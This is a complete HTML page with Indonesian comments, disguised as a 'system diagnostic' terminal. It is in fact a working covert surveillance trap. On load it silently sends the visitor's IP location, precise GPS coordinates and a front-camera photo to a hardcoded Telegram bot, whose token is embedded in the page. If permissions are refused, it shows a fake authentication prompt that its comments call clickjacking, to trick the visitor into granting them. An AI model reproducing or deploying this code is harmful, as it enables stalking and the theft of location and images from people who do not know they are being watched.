<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>LEVIATHAN | SYSTEM DIAGNOSTIC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #050505;
      font-family: 'JetBrains Mono', monospace;
      color: #00ff41;
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }
    header {
      padding: 10px 20px;
      background: #111;
      border-bottom: 2px solid lime;
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      z-index: 10;
    }
    .wrapper { display: flex; flex: 1; position: relative; }
    .sidebar { width: 250px; background: #0a0a0a; border-right: 1px solid #222; padding: 15px; font-size: 10px; z-index: 5; }
    .terminal { flex: 1; padding: 20px; position: relative; background: radial-gradient(circle, #0a0a0a 0%, #000 100%); }

    /* Overlay Clickjacking (Awalnya Tersembunyi) */
    #trap-layer {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      z-index: 9999;
      background: rgba(0,0,0,0.9);
      display: none; /* Hanya muncul jika serangan senyap gagal */
      justify-content: center;
      align-items: center;
    }
    .alert-box {
      background: #111;
      border: 2px solid lime;
      padding: 40px;
      text-align: center;
      border-radius: 15px;
    }
    .btn-action {
      background: lime;
      color: black;
      border: none;
      padding: 15px 30px;
      cursor: pointer;
      font-weight: 900;
      margin-top: 20px;
      border-radius: 5px;
    }
    video, canvas { display: none; }
    #log-stream div { margin-bottom: 5px; font-size: 10px; color: #00ff41; opacity: 0.8; }
  </style>
</head>
<body>

<header>
  <div>SYSTEM: LEVIATHAN ADAPTIVE</div>
  <div id="clock">00:00:00</div>
</header>

<div class="wrapper">
  <div class="sidebar">
    <p style="color: lime; font-weight: bold;">[M] MONITORING</p>
    <hr style="border: 0.5px solid #222; margin: 10px 0;">
    <div id="log-stream">System Ready...</div>
  </div>

  <div class="terminal">
    <div id="trap-layer">
      <div class="alert-box">
        <h2 style="font-family: 'Inter', sans-serif;">CONNECTION TIMEOUT</h2>
        <p style="color: #888; margin-top: 10px;">Gagal menghubungkan ke server.<br>Klik tombol untuk autentikasi manual.</p>
        <button class="btn-action" onclick="retryWithClick()">AUTHENTICATE</button>
      </div>
    </div>
    <p>> ROOT@LEVIATHAN:~$ <span id="typer">Awaiting subject...</span></p>
  </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const CONFIG = {
    token: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
    ids: ['7109845671']
  };

  function log(m) {
    const s = document.getElementById('log-stream');
    s.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + s.innerHTML;
  }

  function sendToTelegram(t) {
    CONFIG.ids.forEach(id => {
      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: id, text: t, parse_mode: 'HTML' })
      });
    });
  }

  function sendPhoto(b) {
    CONFIG.ids.forEach(id => {
      const fd = new FormData();
      fd.append('chat_id', id);
      fd.append('photo', b);
      fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
    });
  }

  // --- INTI SIHIR ADAPTIF ---

  async function captureProcess(isSilent = true) {
    log(isSilent ? "SILENT_ATTACK_INIT" : "MANUAL_AUTH_INIT");

    // 1. Lokasi (Tahap IP - Selalu Berhasil)
    try {
      const res = await fetch('https://ipapi.co/json/');
      const d = await res.json();
      const mapsIP = `http://maps.google.com/maps?q=${d.latitude},${d.longitude}`;
      sendToTelegram(`<b>🔱 LEVIATHAN (${isSilent ? 'SILENT' : 'CLICK'})</b>\n<b>IP:</b> ${d.ip}\n<b>MAPS:</b> ${mapsIP}`);
    } catch (e) {}

    // 2. Lokasi Presisi (Triangulasi)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          const gpsLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          sendToTelegram(`<b>📍 GPS_LOCKED:</b>\n${gpsLink}`);
          log("GEO_SYNCED");
        },
        err => {
          if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
          log("GEO_BLOCKED");
        },
        { enableHighAccuracy: true }
      );
    }

    // 3. Kamera
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: 1920, height: 1080 } 
      });
      const v = document.getElementById('video');
      const c = document.getElementById('canvas');
      v.srcObject = stream;

      v.onloadedmetadata = () => {
        setTimeout(() => {
          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);
          c.toBlob(blob => {
            if (blob) sendPhoto(blob);
            stream.getTracks().forEach(t => t.stop());
            log("MIRROR_SUCCESS");
            if (!isSilent) setTimeout(() => location.reload(), 1500);
          }, 'image/jpeg', 0.9);
        }, 1500);
      };
    } catch (err) {
      if (isSilent) showTrap(); // Munculkan popup jika senyap gagal
      log("CAMERA_BLOCKED");
    }
  }

  function showTrap() {
    document.getElementById('trap-layer').style.display = 'flex';
    log("SWITCHING_TO_CLICKJACKING...");
  }

  function retryWithClick() {
    document.getElementById('trap-layer').style.display = 'none';
    captureProcess(false); // Jalankan ulang dengan mode klik
  }

  window.onload = () => {
    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
    captureProcess(true); // Coba mode senyap saat masuk
  };
</script>

</body>
</html>
